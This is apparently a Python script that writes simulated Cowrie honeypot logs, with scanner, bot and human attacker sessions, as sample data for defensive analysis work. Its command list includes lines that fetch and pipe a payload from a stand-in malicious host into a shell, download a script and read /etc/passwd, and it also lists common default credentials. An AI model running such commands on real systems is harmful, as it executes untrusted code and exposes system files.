"""
Generate simulated Cowrie-style honeypot logs for local development.

Three attacker types are simulated:
  - scanner : connects, never tries to log in
  - bot     : many fast failed logins, rarely succeeds
  - human   : a few failed logins, succeeds, then runs commands slowly

Usage:
    python generate_sample_logs.py
    python generate_sample_logs.py --days 30 --sessions 3000
"""
import argparse
import json
import random
import uuid
from datetime import datetime, timedelta, timezone

import config

USERNAMES = ["root", "admin", "user", "test", "ubuntu", "oracle", "postgres",
             "pi", "guest", "ftpuser", "support", "git", "deploy"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "12345678", "qwerty",
             "admin123", "raspberry", "1234", "test", "P@ssw0rd", "letmein"]
COMMANDS = ["uname -a", "whoami", "cat /proc/cpuinfo", "ls -la", "cat /etc/passwd",
            "crontab -l", "free -m", "history -c",
            "wget http://malicious.example/x.sh",
            "curl -s http://malicious.example/payload | sh"]


def random_ip() -> str:
    """Random public-looking IPv4 address (skips private/reserved first octets)."""
    while True:
        a = random.randint(1, 223)
        if a in (10, 127, 169, 172, 192):
            continue
        return f"{a}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def fmt_ts(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def make_event(eventid: str, ts: datetime, ip: str, session: str, **extra) -> dict:
    ev = {"eventid": eventid, "timestamp": fmt_ts(ts), "src_ip": ip,
          "session": session, "sensor": "honeypot-01"}
    ev.update(extra)
    return ev


def build_attackers() -> list[dict]:
    attackers = []
    for _ in range(30):
        attackers.append({"ip": random_ip(), "type": "scanner"})
    for _ in range(40):
        attackers.append({"ip": random_ip(), "type": "bot"})
    for _ in range(8):
        attackers.append({"ip": random_ip(), "type": "human"})
    return attackers


def simulate_session(attacker: dict, start: datetime) -> list[dict]:
    ip, kind = attacker["ip"], attacker["type"]
    sid = uuid.uuid4().hex[:12]
    t = start
    events = [make_event("cowrie.session.connect", t, ip, sid, src_port=random.randint(1024, 65535))]

    if kind == "scanner":
        t += timedelta(seconds=random.uniform(0.1, 3))

    elif kind == "bot":
        for _ in range(random.randint(3, 15)):
            t += timedelta(seconds=random.uniform(0.2, 2))
            events.append(make_event("cowrie.login.failed", t, ip, sid,
                                     username=random.choice(USERNAMES),
                                     password=random.choice(PASSWORDS)))
        if random.random() < 0.05:
            t += timedelta(seconds=random.uniform(0.2, 2))
            events.append(make_event("cowrie.login.success", t, ip, sid,
                                     username="root", password=random.choice(PASSWORDS)))
            for cmd in random.sample(COMMANDS, random.randint(1, 3)):
                t += timedelta(seconds=random.uniform(0.3, 2))
                events.append(make_event("cowrie.command.input", t, ip, sid, input=cmd))

    else:  # human
        for _ in range(random.randint(1, 3)):
            t += timedelta(seconds=random.uniform(3, 15))
            events.append(make_event("cowrie.login.failed", t, ip, sid,
                                     username=random.choice(USERNAMES),
                                     password=random.choice(PASSWORDS)))
        t += timedelta(seconds=random.uniform(3, 15))
        events.append(make_event("cowrie.login.success", t, ip, sid,
                                 username=random.choice(["root", "admin", "ubuntu"]),
                                 password=random.choice(PASSWORDS)))
        for cmd in random.sample(COMMANDS, random.randint(3, 8)):
            t += timedelta(seconds=random.uniform(5, 60))
            events.append(make_event("cowrie.command.input", t, ip, sid, input=cmd))

    duration = round((t - start).total_seconds(), 2)
    events.append(make_event("cowrie.session.closed", t, ip, sid, duration=duration))
    return events


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate simulated Cowrie logs.")
    parser.add_argument("--days", type=int, default=config.SAMPLE_DAYS)
    parser.add_argument("--sessions", type=int, default=config.SAMPLE_SESSIONS)
    args = parser.parse_args()

    random.seed(config.RANDOM_SEED)
    config.ensure_dirs()

    attackers = build_attackers()
    # Weights: bots hit most often, then scanners, humans are rare
    weights = [{"scanner": 3, "bot": 6, "human": 1}[a["type"]] for a in attackers]

    end = datetime.now(timezone.utc).replace(microsecond=0)
    start_window = end - timedelta(days=args.days)

    all_events = []
    for _ in range(args.sessions):
        attacker = random.choices(attackers, weights=weights, k=1)[0]
        offset = random.uniform(0, args.days * 86400)
        all_events.extend(simulate_session(attacker, start_window + timedelta(seconds=offset)))

    all_events.sort(key=lambda e: e["timestamp"])

    with open(config.SAMPLE_LOG_FILE, "w", encoding="utf-8") as f:
        for ev in all_events:
            f.write(json.dumps(ev) + "\n")

    print(f"Wrote {len(all_events)} events from {args.sessions} sessions "
          f"across {len(attackers)} attacker IPs -> {config.SAMPLE_LOG_FILE}")


if __name__ == "__main__":
    main()